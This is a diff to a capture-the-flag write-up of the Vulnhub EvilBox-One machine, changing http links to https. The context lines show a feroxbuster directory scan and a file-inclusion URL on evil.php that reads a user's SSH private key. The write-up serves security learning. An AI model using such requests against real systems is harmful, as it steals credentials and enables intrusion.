@@ -50,7 +50,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Now lets see the Directory Listing files —>
 
 ```bash
-feroxbuster -u http://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,js
+feroxbuster -u https://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,js
 ```
 {: .nolineno}
 
@@ -74,7 +74,7 @@ Lets see the result on web —>
 
 Now I know user mowree so lets access for ssh private key through `/home/mowree/.ssh/id_rsa` →
 
-[http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa](http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa)
+[http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa](https://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa)
 
 ![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%205.png)
 
